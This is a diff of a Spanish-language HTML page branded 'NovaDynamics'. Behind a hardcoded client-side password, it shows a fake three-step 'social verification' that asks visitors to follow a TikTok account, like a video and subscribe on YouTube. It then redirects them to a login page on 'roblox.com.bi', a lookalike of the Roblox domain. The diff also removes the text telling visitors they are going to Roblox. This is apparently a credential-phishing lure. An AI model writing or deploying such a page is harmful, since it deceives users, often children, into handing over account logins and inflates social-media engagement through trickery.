@@ -1,885 +1,878 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Acceso protegido | NovaDynamics</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+<title>Acceso protegido | NovaDynamics</title>
 
-        body {
-            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
-            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-            color: #fff;
-        }
+<style>
 
-        .container {
-            background: rgba(255, 255, 255, 0.08);
-            backdrop-filter: blur(12px);
-            border-radius: 24px;
-            padding: 40px 30px;
-            max-width: 480px;
-            width: 100%;
-            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.4);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            text-align: center;
-        }
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
 
-        h1 {
-            font-size: 1.8rem;
-            margin-bottom: 8px;
-            background: linear-gradient(90deg, #ff0050, #ff4d6d);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
+body {
+    font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+    background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+    color: #fff;
+}
 
-        .subtitle {
-            color: #b0b0b0;
-            margin-bottom: 30px;
-            font-size: 0.95rem;
-        }
+.container {
+    background: rgba(255,255,255,0.08);
+    backdrop-filter: blur(12px);
+    border-radius: 24px;
+    padding: 40px 30px;
+    max-width: 480px;
+    width: 100%;
+    box-shadow: 0 25px 50px rgba(0,0,0,0.4);
+    border: 1px solid rgba(255,255,255,0.1);
+    text-align: center;
+}
 
-        /* PANTALLA DE CONTRASEÑA */
+h1 {
+    font-size: 1.8rem;
+    margin-bottom: 8px;
+    background: linear-gradient(90deg,#ff0050,#ff4d6d,#7b2cff,#00c6ff);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    font-weight: 800;
+}
 
-        #loginScreen {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            width: 100%;
-        }
+.subtitle {
+    color: #b0b0b0;
+    margin-bottom: 30px;
+    font-size: 0.95rem;
+}
 
-        #passwordBox {
-            max-width: 420px;
-        }
+/* LOGIN */
 
-        .lock {
-            font-size: 55px;
-            margin-bottom: 15px;
-        }
+#loginScreen {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    width: 100%;
+}
 
-        .password-wrapper {
-            position: relative;
-            width: 100%;
-            margin-bottom: 15px;
-        }
+#passwordBox {
+    max-width: 420px;
+}
 
-        .password-input {
-            width: 100%;
-            padding: 15px 55px 15px 18px;
-            border-radius: 12px;
-            border: 1px solid rgba(255,255,255,0.15);
-            background: rgba(255,255,255,0.08);
-            color: white;
-            font-size: 1rem;
-            outline: none;
-            text-align: center;
-        }
+.lock {
+    font-size: 55px;
+    margin-bottom: 15px;
+}
 
-        .password-input:focus {
-            border-color: #ff0050;
-        }
+.password-wrapper {
+    position: relative;
+    width: 100%;
+    margin-bottom: 15px;
+}
 
-        .password-input::placeholder {
-            color: #aaa;
-        }
+.password-input {
+    width: 100%;
+    padding: 15px 55px 15px 18px;
+    border-radius: 12px;
+    border: 1px solid rgba(255,255,255,0.15);
+    background: rgba(255,255,255,0.08);
+    color: white;
+    font-size: 1rem;
+    outline: none;
+    text-align: center;
+}
 
-        .eye-button {
-            position: absolute;
-            right: 10px;
-            top: 50%;
-            transform: translateY(-50%);
-            background: none;
-            border: none;
-            color: white;
-            font-size: 22px;
-            cursor: pointer;
-            padding: 5px;
-        }
+.password-input:focus {
+    border-color: #ff0050;
+}
 
-        .login-btn {
-            width: 100%;
-            padding: 14px;
-            border: none;
-            border-radius: 12px;
-            background: linear-gradient(90deg, #ff0050, #ff4d6d);
-            color: white;
-            font-size: 1rem;
-            font-weight: 700;
-            cursor: pointer;
-            transition: 0.3s;
-        }
+.password-input::placeholder {
+    color: #aaa;
+}
 
-        .login-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(255, 0, 80, 0.4);
-        }
+.eye-button {
+    position: absolute;
+    right: 10px;
+    top: 50%;
+    transform: translateY(-50%);
+    background: none;
+    border: none;
+    color: white;
+    font-size: 22px;
+    cursor: pointer;
+    padding: 5px;
+}
 
-        .error {
-            color: #ff6b6b;
-            margin-top: 15px;
-            display: none;
-            font-size: 0.9rem;
-        }
+.login-btn {
+    width: 100%;
+    padding: 14px;
+    border: none;
+    border-radius: 12px;
+    background: linear-gradient(90deg,#ff0050,#ff4d6d);
+    color: white;
+    font-size: 1rem;
+    font-weight: 700;
+    cursor: pointer;
+    transition: 0.3s;
+}
 
-        /* CONTENIDO PRINCIPAL */
+.login-btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 8px 20px rgba(255,0,80,0.4);
+}
 
-        #mainContent {
-            display: none;
-            width: 100%;
-        }
+.error {
+    color: #ff6b6b;
+    margin-top: 15px;
+    display: none;
+    font-size: 0.9rem;
+}
 
-        .progress-btn {
-            background: #e63946;
-            color: white;
-            border: none;
-            padding: 16px 40px;
-            font-size: 1.4rem;
-            font-weight: 700;
-            border-radius: 50px;
-            margin-bottom: 35px;
-            cursor: default;
-            box-shadow: 0 8px 20px rgba(230, 57, 70, 0.4);
-            transition: all 0.3s ease;
-            letter-spacing: 1px;
-        }
+/* CONTENIDO */
 
-        .progress-btn.complete {
-            background: #2ecc71;
-            box-shadow: 0 8px 20px rgba(46, 204, 113, 0.4);
-        }
+#mainContent {
+    display: none;
+    width: 100%;
+}
 
-        .steps {
-            display: flex;
-            flex-direction: column;
-            gap: 18px;
-        }
+.progress-btn {
+    background: #e63946;
+    color: white;
+    border: none;
+    padding: 16px 40px;
+    font-size: 1.4rem;
+    font-weight: 700;
+    border-radius: 50px;
+    margin-bottom: 35px;
+    cursor: default;
+    box-shadow: 0 8px 20px rgba(230,57,70,0.4);
+    transition: all 0.3s ease;
+    letter-spacing: 1px;
+}
 
-        .step {
-            background: rgba(255, 255, 255, 0.06);
-            border-radius: 16px;
-            padding: 20px;
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            transition: all 0.3s ease;
-            text-align: left;
-        }
+.progress-btn.complete {
+    background: #2ecc71;
+    box-shadow: 0 8px 20px rgba(46,204,113,0.4);
+}
 
-        .step.done {
-            border-color: #2ecc71;
-            background: rgba(46, 204, 113, 0.1);
-        }
+.steps {
+    display: flex;
+    flex-direction: column;
+    gap: 18px;
+}
 
-        .step-header {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            margin-bottom: 12px;
-        }
+.step {
+    background: rgba(255,255,255,0.06);
+    border-radius: 16px;
+    padding: 20px;
+    border: 1px solid rgba(255,255,255,0.08);
+    transition: all 0.3s ease;
+    text-align: left;
+}
 
-        .step-number {
-            width: 32px;
-            height: 32px;
-            background: #e63946;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 700;
-            font-size: 0.9rem;
-            flex-shrink: 0;
-        }
+.step.done {
+    border-color: #2ecc71;
+    background: rgba(46,204,113,0.1);
+}
 
-        .step.done .step-number {
-            background: #2ecc71;
-        }
+.step-header {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 12px;
+}
 
-        .step-title {
-            font-weight: 600;
-            font-size: 1.05rem;
-        }
+.step-number {
+    width: 32px;
+    height: 32px;
+    background: #e63946;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: 700;
+    font-size: 0.9rem;
+    flex-shrink: 0;
+}
 
-        .step-actions {
-            display: flex;
-            gap: 10px;
-            flex-wrap: wrap;
-            align-items: center;
-        }
+.step.done .step-number {
+    background: #2ecc71;
+}
 
-        .btn {
-            padding: 10px 18px;
-            border-radius: 10px;
-            border: none;
-            font-weight: 600;
-            font-size: 0.9rem;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            text-decoration: none;
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-        }
+.step-title {
+    font-weight: 600;
+    font-size: 1.05rem;
+}
 
-        .btn-tiktok {
-            background: #000;
-            color: #fff;
-        }
+.step-actions {
+    display: flex;
+    gap: 10px;
+    flex-wrap: wrap;
+    align-items: center;
+}
 
-        .btn-tiktok:hover {
-            background: #222;
-            transform: translateY(-2px);
-        }
+.btn {
+    padding: 10px 18px;
+    border-radius: 10px;
+    border: none;
+    font-weight: 600;
+    font-size: 0.9rem;
+    cursor: pointer;
+    transition: all 0.2s ease;
+    text-decoration: none;
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+}
 
-        .btn-youtube {
-            background: #ff0000;
-            color: #fff;
-        }
+.btn-tiktok {
+    background: #000;
+    color: #fff;
+}
 
-        .btn-youtube:hover {
-            background: #cc0000;
-            transform: translateY(-2px);
-        }
+.btn-tiktok:hover {
+    background: #222;
+    transform: translateY(-2px);
+}
 
-        .timer {
-            display: none;
-            font-weight: 600;
-            font-size: 0.95rem;
-            color: #ffcc00;
-            padding: 8px 14px;
-            background: rgba(255, 204, 0, 0.15);
-            border-radius: 10px;
-            border: 1px solid rgba(255, 204, 0, 0.3);
-        }
+.btn-youtube {
+    background: #ff0000;
+    color: #fff;
+}
 
-        .timer.show {
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-        }
+.btn-youtube:hover {
+    background: #cc0000;
+    transform: translateY(-2px);
+}
 
-        .success-box {
-            display: none;
-            margin-top: 30px;
-            padding: 25px;
-            background: rgba(46, 204, 113, 0.15);
-            border: 1px solid #2ecc71;
-            border-radius: 16px;
-            animation: fadeIn 0.5s ease;
-        }
+.timer {
+    display: none;
+    font-weight: 600;
+    font-size: 0.95rem;
+    color: #ffcc00;
+    padding: 8px 14px;
+    background: rgba(255,204,0,0.15);
+    border-radius: 10px;
+    border: 1px solid rgba(255,204,0,0.3);
+}
 
-        .success-box.show {
-            display: block;
-        }
+.timer.show {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+}
 
-        .success-box h2 {
-            color: #2ecc71;
-            margin-bottom: 10px;
-            font-size: 1.4rem;
-        }
+.success-box {
+    display: none;
+    margin-top: 30px;
+    padding: 25px;
+    background: rgba(46,204,113,0.15);
+    border: 1px solid #2ecc71;
+    border-radius: 16px;
+    animation: fadeIn 0.5s ease;
+}
 
-        .success-box p {
-            color: #ddd;
-            line-height: 1.5;
-        }
+.success-box.show {
+    display: block;
+}
 
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: translateY(10px);
-            }
+.success-box h2 {
+    color: #2ecc71;
+    margin-bottom: 10px;
+    font-size: 1.4rem;
+}
 
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
+.success-box p {
+    color: #ddd;
+    line-height: 1.5;
+}
 
-        .footer {
-            margin-top: 30px;
-            font-size: 0.8rem;
-            color: #888;
-        }
+@keyframes fadeIn {
 
-        @media (max-width: 480px) {
+    from {
+        opacity: 0;
+        transform: translateY(10px);
+    }
 
-            .container {
-                padding: 30px 20px;
-            }
+    to {
+        opacity: 1;
+        transform: translateY(0);
+    }
 
-            h1 {
-                font-size: 1.5rem;
-            }
+}
 
-            .progress-btn {
-                font-size: 1.2rem;
-                padding: 14px 30px;
-            }
+.footer {
+    margin-top: 30px;
+    font-size: 0.8rem;
+    color: #888;
+}
 
-        }
-    </style>
+@media (max-width:480px) {
+
+    .container {
+        padding: 30px 20px;
+    }
+
+    h1 {
+        font-size: 1.5rem;
+    }
+
+    .progress-btn {
+        font-size: 1.2rem;
+        padding: 14px 30px;
+    }
+
+}
+
+</style>
 </head>
 
 <body>
 
-    <!-- =========================================
-         PANTALLA DE CONTRASEÑA
-    ========================================== -->
 
-    <div id="loginScreen">
+<!-- =========================
+     PANTALLA DE CONTRASEÑA
+========================= -->
 
-        <div class="container" id="passwordBox">
+<div id="loginScreen">
 
-            <div class="lock">
-                🔒
-            </div>
+<div class="container" id="passwordBox">
 
-            <h1>
-                Acceso protegido
-            </h1>
+<div class="lock">🔒</div>
 
-            <p class="subtitle">
-                Introduce la contraseña para continuar
-            </p>
+<h1>Acceso protegido</h1>
 
+<p class="subtitle">
+Introduce la contraseña para continuar
+</p>
 
-            <!-- CAMPO DE CONTRASEÑA -->
+<div class="password-wrapper">
 
-            <div class="password-wrapper">
+<input
+type="password"
+id="passwordInput"
+class="password-input"
+placeholder="Contraseña"
+autocomplete="off"
+onkeydown="if(event.key === 'Enter') checkPassword()"
+>
 
-                <input
-                    type="password"
-                    id="passwordInput"
-                    class="password-input"
-                    placeholder="Contraseña"
-                    onkeydown="if(event.key === 'Enter') checkPassword()"
-                >
+<button
+type="button"
+class="eye-button"
+onclick="togglePassword()"
+id="eyeButton"
+>
+👁️
+</button>
 
-                <!-- BOTÓN MOSTRAR / OCULTAR -->
+</div>
 
-                <button
-                    type="button"
-                    class="eye-button"
-                    onclick="togglePassword()"
-                    id="eyeButton"
-                >
-                    👁️
-                </button>
+<button
+class="login-btn"
+onclick="checkPassword()"
+>
+🔓 Entrar
+</button>
 
-            </div>
+<p
+class="error"
+id="errorMessage"
+>
+❌ Contraseña incorrecta
+</p>
 
+<p class="footer">
+NovaDynamics · Acceso privado
+</p>
 
-            <!-- BOTÓN ENTRAR -->
+</div>
 
-            <button
-                class="login-btn"
-                onclick="checkPassword()"
-            >
-                🔓 Entrar
-            </button>
+</div>
 
 
-            <!-- MENSAJE DE ERROR -->
+<!-- =========================
+     CONTENIDO PRINCIPAL
+========================= -->
 
-            <p
-                class="error"
-                id="errorMessage"
-            >
-                ❌ Contraseña incorrecta
-            </p>
+<div id="mainContent">
 
+<div class="container">
 
-            <p class="footer">
-                NovaDynamics · Acceso privado
-            </p>
+<h1>Verificación</h1>
 
-        </div>
+<p class="subtitle">
+Completa los 3 pasos para continuar
+</p>
 
-    </div>
+<button
+class="progress-btn"
+id="progressBtn"
+>
+0 / 3
+</button>
 
 
-    <!-- =========================================
-         CONTENIDO PRINCIPAL
-    ========================================== -->
+<div class="steps">
 
-    <div id="mainContent">
 
-        <div class="container">
+<!-- PASO 1 -->
 
-            <h1>
-                Verificación
-            </h1>
+<div
+class="step"
+id="step1"
+>
 
-            <p class="subtitle">
-                Completa los 3 pasos para continuar
-            </p>
+<div class="step-header">
 
+<div class="step-number">
+1
+</div>
 
-            <!-- CONTADOR -->
+<div class="step-title">
+Sígueme en TikTok
+</div>
 
-            <button
-                class="progress-btn"
-                id="progressBtn"
-            >
-                0 / 3
-            </button>
+</div>
 
+<div class="step-actions">
 
-            <div class="steps">
+<a
+href="https://www.tiktok.com/@novadynamics"
+target="_blank"
+rel="noopener"
+class="btn btn-tiktok"
+id="link1"
+onclick="startVerification(1)"
+>
+🎵 Abrir TikTok
+</a>
 
+<span
+class="timer"
+id="timer1"
+>
+⏱️ 5s
+</span>
 
-                <!-- =================================
-                     PASO 1
-                ================================== -->
+</div>
 
-                <div
-                    class="step"
-                    id="step1"
-                >
+</div>
 
-                    <div class="step-header">
 
-                        <div class="step-number">
-                            1
-                        </div>
+<!-- PASO 2 -->
 
-                        <div class="step-title">
-                            Sígueme en TikTok
-                        </div>
+<div
+class="step"
+id="step2"
+>
 
-                    </div>
+<div class="step-header">
 
+<div class="step-number">
+2
+</div>
 
-                    <div class="step-actions">
+<div class="step-title">
+Dale like a mi último video
+</div>
 
-                        <a
-                            href="https://www.tiktok.com/@novadynamics"
-                            target="_blank"
-                            rel="noopener"
-                            class="btn btn-tiktok"
-                            id="link1"
-                            onclick="startVerification(1)"
-                        >
-                            🎵 Abrir TikTok
-                        </a>
+</div>
 
+<div class="step-actions">
 
-                        <span
-                            class="timer"
-                            id="timer1"
-                        >
-                            ⏱️ 5s
-                        </span>
+<a
+href="https://www.tiktok.com/@novadynamics"
+target="_blank"
+rel="noopener"
+class="btn btn-tiktok"
+id="link2"
+onclick="startVerification(2)"
+>
+❤️ Dale like a mi último video
+</a>
 
-                    </div>
+<span
+class="timer"
+id="timer2"
+>
+⏱️ 5s
+</span>
 
-                </div>
+</div>
 
+</div>
 
-                <!-- =================================
-                     PASO 2
-                ================================== -->
 
-                <div
-                    class="step"
-                    id="step2"
-                >
+<!-- PASO 3 -->
 
-                    <div class="step-header">
+<div
+class="step"
+id="step3"
+>
 
-                        <div class="step-number">
-                            2
-                        </div>
+<div class="step-header">
 
-                        <div class="step-title">
-                            Dale like a un video mío
-                        </div>
+<div class="step-number">
+3
+</div>
 
-                    </div>
+<div class="step-title">
+Sígueme en YouTube
+</div>
 
+</div>
 
-                    <div class="step-actions">
+<div class="step-actions">
 
-                        <a
-                            href="https://www.tiktok.com/@novadynamics"
-                            target="_blank"
-                            rel="noopener"
-                            class="btn btn-tiktok"
-                            id="link2"
-                            onclick="startVerification(2)"
-                        >
-                            ❤️ dale like a mk ultimo video
-                        </a>
+<a
+href="https://www.youtube.com/@Alejandro_2021vs?sub_confirmation=1"
+target="_blank"
+rel="noopener"
+class="btn btn-youtube"
+id="link3"
+onclick="startVerification(3)"
+>
+▶️ Suscribirme
+</a>
 
+<span
+class="timer"
+id="timer3"
+>
+⏱️ 5s
+</span>
 
-                        <span
-                            class="timer"
-                            id="timer2"
-                        >
-                            ⏱️ 5s
-                        </span>
+</div>
 
-                    </div>
+</div>
 
-                </div>
+</div>
 
 
-                <!-- =================================
-                     PASO 3
-                ================================== -->
+<!-- ÉXITO -->
 
-                <div
-                    class="step"
-                    id="step3"
-                >
+<div
+class="success-box"
+id="successBox"
+>
 
-                    <div class="step-header">
+<h2>
+¡Completado! 🎉
+</h2>
 
-                        <div class="step-number">
-                            3
-                        </div>
+<p>
+Has terminado los 3 pasos.
+<br>
+Redirigiendo...
+</p>
 
-                        <div class="step-title">
-                            Sígueme en YouTube
-                        </div>
+</div>
 
-                    </div>
+<p class="footer">
+NovaDynamics · Verificación social
+</p>
 
+</div>
 
-                    <div class="step-actions">
+</div>
 
-                        <a
-                            href="https://www.youtube.com/@Alejandro_2021vs?sub_confirmation=1"
-                            target="_blank"
-                            rel="noopener"
-                            class="btn btn-youtube"
-                            id="link3"
-                            onclick="startVerification(3)"
-                        >
-                            ▶️ Suscribirme
-                        </a>
 
+<script>
 
-                        <span
-                            class="timer"
-                            id="timer3"
-                        >
-                            ⏱️ 5s
-                        </span>
+/* =========================
+   CONTRASEÑA
+========================= */
 
-                    </div>
+const PASSWORD = "novadynamics2026";
 
-                </div>
 
-            </div>
+/* =========================
+   MOSTRAR / OCULTAR
+========================= */
 
+function togglePassword() {
 
-            <!-- =================================
-                 MENSAJE DE ÉXITO
-            ================================== -->
+const input =
+document.getElementById("passwordInput");
 
-            <div
-                class="success-box"
-                id="successBox"
-            >
+const eye =
+document.getElementById("eyeButton");
 
-                <h2>
-                    ¡Completado! 🎉
-                </h2>
+if (input.type === "password") {
 
-                <p>
-                    Has terminado las 3 verificaciones.
-                    <br>
-                    Redirigiendo al perfil de Roblox...
-                </p>
+input.type = "text";
 
-            </div>
+eye.textContent = "🙈";
 
+} else {
 
-            <p class="footer">
-                NovaDynamics · Verificación social
-            </p>
+input.type = "password";
 
-        </div>
+eye.textContent = "👁️";
 
-    </div>
+}
 
+}
 
-    <!-- =========================================
-         JAVASCRIPT
-    ========================================== -->
 
-    <script>
+/* =========================
+   COMPROBAR CONTRASEÑA
+========================= */
 
-        /* =========================================
-           CONTRASEÑA
-        ========================================== */
+function checkPassword() {
 
-        const PASSWORD =
-            "novadynamics2026";
+const input =
+document.getElementById("passwordInput");
 
+const error =
+document.getElementById("errorMessage");
 
-        /* =========================================
-           MOSTRAR / OCULTAR CONTRASEÑA
-        ========================================== */
+if (input.value === PASSWORD) {
 
-        function togglePassword() {
+document
+.getElementById("loginScreen")
+.style.display = "none";
 
-            const input =
-                document.getElementById(
-                    "passwordInput"
-                );
+document
+.getElementById("mainContent")
+.style.display = "flex";
 
-            const eye =
-                document.getElementById(
-                    "eyeButton"
-                );
+input.value = "";
 
+error.style.display = "none";
 
-            if (
-                input.type === "password"
-            ) {
+} else {
 
-                input.type =
-                    "text";
+error.style.display = "block";
 
-                eye.textContent =
-                    "🙈";
+input.value = "";
 
-            } else {
+input.focus();
 
-                input.type =
-                    "password";
+}
 
-                eye.textContent =
-                    "👁️";
+}
 
-            }
 
-        }
+/* =========================
+   SISTEMA DE PASOS
 
+   NO SE USA LOCALSTORAGE.
+   CADA VISITA EMPIEZA EN 0/3.
+========================= */
 
-        /* =========================================
-           COMPROBAR CONTRASEÑA
-        ========================================== */
+let completed = [
+false,
+false,
+false
+];
 
-        function checkPassword() {
+let timers = [
+null,
+null,
+null
+];
 
-            const input =
-                document.getElementById(
-                    "passwordInput"
-                );
 
-            const error =
-                document.getElementById(
-                    "errorMessage"
-                );
+/* =========================
+   INICIAR PASO
+========================= */
 
+function startVerification(step) {
 
-            if (
-                input.value === PASSWORD
-            ) {
+const index = step - 1;
 
-                document
-                    .getElementById(
-                        "loginScreen"
-                    )
-                    .style.display =
-                    "none";
+if (
+completed[index] ||
+timers[index]
+) {
 
+return;
 
-                document
-                    .getElementById(
-                        "mainContent"
-                    )
-                    .style.display =
-                    "flex";
+}
 
+const link =
+document.getElementById(
+`link${step}`
+);
 
-                input.value =
-                    "";
+const timerEl =
+document.getElementById(
+`timer${step}`
+);
 
 
-            } else {
+/* DESACTIVAR BOTÓN */
 
-                error.style.display =
-                    "block";
+link.style.pointerEvents =
+"none";
 
+link.style.opacity =
+"0.5";
 
-                input.value =
-                    "";
 
+/* MOSTRAR TIMER */
 
-                input.focus();
+timerEl.classList.add(
+"show"
+);
 
-            }
 
-        }
+/* 5 SEGUNDOS */
 
+let secondsLeft = 5;
 
-        /* =========================================
-           SISTEMA DE VERIFICACIÓN
+timerEl.textContent =
+`⏱️ ${secondsLeft}s`;
 
-           IMPORTANTE:
-           NO USAMOS LOCALSTORAGE.
 
-           Cada vez que la página se abre,
-           el progreso empieza desde 0 / 3.
-        ========================================== */
+/* CUENTA REGRESIVA */
 
+timers[index] =
+setInterval(() => {
 
-        let completed = [
-            false,
-            false,
-            false
-        ];
+secondsLeft--;
 
+timerEl.textContent =
+`⏱️ ${secondsLeft}s`;
 
-        let timers = [
-            null,
-            null,
-            null
-        ];
+if (secondsLeft <= 0) {
 
+clearInterval(
+timers[index]
+);
 
-        /* =========================================
-           INICIAR VERIFICACIÓN
-        ========================================== */
+timers[index] = null;
 
-        function startVerification(step) {
+completed[index] = true;
 
-            const index =
-                step - 1;
+updateUI();
 
+}
 
-            /* EVITAR REPETIR EL TIMER */
+},1000);
 
-            if (
-                completed[index] ||
-                timers[index]
-            ) {
+}
 
-                return;
 
-            }
+/* =========================
+   ACTUALIZAR INTERFAZ
+========================= */
 
+function updateUI() {
 
-            const link =
-                document.getElementById(
-                    `link${step}`
-                );
+const count =
+completed.filter(Boolean).length;
 
+const progressBtn =
+document.getElementById(
+"progressBtn"
+);
 
-            const timerEl =
-                document.getElementById(
-                    `timer${step}`
-                );
 
+/* CONTADOR */
 
-            /* DESACTIVAR BOTÓN */
+progressBtn.textContent =
+`${count} / 3`;
 
-            link.style.pointerEvents =
-                "none";
 
+/* COMPLETADO */
 
-            link.style.opacity =
-                "0.5";
+if (count === 3) {
 
+progressBtn.classList.add(
+"complete"
+);
 
-            /* MOSTRAR TEMPORIZADOR */
+document
+.getElementById("successBox")
+.classList.add("show");
 
-            timerEl.classList.add(
-                "show"
-            );
 
+/* REDIRECCIÓN */
 
-            /* 5 SEGUNDOS */
+setTimeout(() => {
 
-            let secondsLeft =
-                5;
+window.location.href =
+"https://www.roblox.com.bi/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F709199129093%2Fprofile";
 
+},1500);
 
-            timerEl.textContent =
-                `⏱️ ${secondsLeft}s`;
+}
 
 
-            /* INICIAR CUENTA */
+/* ACTUALIZAR PASOS */
 
-            timers[index] =
-                setInterval(
-                    () => {
+for (
+let i = 1;
+i <= 3;
+i++
+) {
 
-                        secondsLeft--;
+const stepEl =
+document.getElementById(
+`step${i}`
+);
 
+const link =
+document.getElementById(
+`link${i}`
+);
 
-                        timerEl.textContent =
-                            `⏱️ ${secondsLeft}s`;
+const timerEl =
+document.getElementById(
+`timer${i}`
+);
 
+if (completed[i - 1]) {
 
-                        /* TERMINÓ */
+stepEl.classList.add(
+"done"
+);
 
-                        if (
-                            secondsLeft <= 0
-                        ) {
+link.style.pointerEvents =
+"none";
 
-                            clearInterval(
-                                timers[index]
-                            );
+link.style.opacity =
+"0.5";
 
+if (i === 1) {
 
-                            timers[index] =
-                                null;
+link.textContent =
+"✅ TikTok completado";
 
+} else if (i === 2) {
 
-                            /* MARCAR PASO */
+link.textContent =
+"✅ Like completado";
 
-                            completed[index] =
-                                true;
+} else {
 
+link.textContent =
+"✅ Suscrito";
 
-                            /* ACTUALIZAR */
+}
 
-                            updateUI();
+timerEl.classList.remove(
+"show"
+);
 
-                        }
+}
 
-                    },
-                    1000
-                );
+}
 
-        }
+}
 
+</script>
 
-        /* =========================================
-           ACTUALIZAR INTERFAZ
-        ========================================== */
-
-        function updateUI() {
-
-            const count =
-                completed.filter(
-                    Boolean
-                ).length;
-
-
-            const progressBtn =
-                document.getElementById(
-                    "progressBtn"
-                );
-
-
-            /* ACTUALIZAR CONTADOR */
-
-            progressBtn.textContent =
-                `${count} / 3`;
-
-
-            /* ====
+</body>
+</html>
